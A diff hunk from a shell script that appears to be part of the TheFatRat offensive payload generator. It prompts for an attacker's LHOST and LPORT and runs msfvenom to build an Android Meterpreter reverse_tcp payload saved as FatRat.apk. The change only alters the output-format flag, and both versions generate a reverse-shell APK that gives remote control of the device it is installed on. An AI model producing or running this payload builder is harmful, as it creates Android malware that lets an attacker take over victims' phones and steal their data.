@@ -232,7 +232,7 @@ echo""
 				cd "output"
 				echo -e $okegreen""
 				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport
-         			msfvenom -p android/meterpreter/reverse_tcp LHOST=$yourip LPORT=$yourport -f apk > FatRat.apk
+         			msfvenom -p android/meterpreter/reverse_tcp LHOST=$yourip LPORT=$yourport R > FatRat.apk
           			echo -e "Shell Saved To output Folder "
 			elif test $fatrat1 == '4'
 				then
